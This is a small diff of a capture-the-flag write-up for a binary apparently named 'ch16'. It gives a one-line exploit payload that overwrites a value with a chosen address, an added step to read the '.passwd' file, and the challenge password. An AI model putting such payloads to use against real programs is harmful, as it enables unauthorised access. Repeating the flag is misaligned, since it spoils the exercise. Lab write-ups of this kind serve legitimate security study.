@@ -92,6 +92,7 @@ With the program provided, we have 2 main functions:
 So just enter **i** with **0x08** 4 times and assign the desired value **0xbffffabc** in little endian format.
 
 Payload: `(python -c "print('\x08'*4+'\xbc\xfa\xff\xbf')";cat) | ./ch16`
+Then read the `.passwd` file.
 
 Password: Sm4shM3ify0uC4n
 
